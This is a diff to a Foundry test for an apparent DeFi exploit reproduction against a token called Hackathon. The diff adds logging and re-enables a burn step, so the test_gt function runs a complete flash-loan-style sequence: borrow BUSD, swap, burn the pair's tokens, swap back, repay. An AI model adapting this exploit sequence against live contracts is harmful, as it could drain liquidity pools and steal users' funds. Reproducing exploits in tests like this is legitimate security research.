@@ -189,20 +189,33 @@ contract HackathonTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 2200 * 1e18);
         borrow_busd_owner(2200 * 1e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", busd.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(busd.balanceOf(attacker), address(busd))
+        );
         swap_pair_attacker_busd_hackathon(
             busd.balanceOf(attacker),
             pair.getAmountOut(busd.balanceOf(attacker), address(busd))
         );
         printBalance("After step1 ");
-        // burn_hackathon_pair(hackathon.balanceOf(attacker));
+        emit log_named_uint("amt3", hackathon.balanceOf(attacker));
+        burn_hackathon_pair(hackathon.balanceOf(attacker));
         printBalance("After step2 ");
+        emit log_named_uint("amt4", hackathon.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(hackathon.balanceOf(attacker), address(hackathon))
+        );
         swap_pair_attacker_hackathon_busd(
             hackathon.balanceOf(attacker),
             pair.getAmountOut(hackathon.balanceOf(attacker), address(hackathon))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", (2200 * 1e18 * 1003) / 1000);
         payback_busd_owner((2200 * 1e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -225,7 +238,7 @@ contract HackathonTestBase is Test, BlockLoader {
         burn_hackathon_pair(amt3);
         swap_pair_attacker_hackathon_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
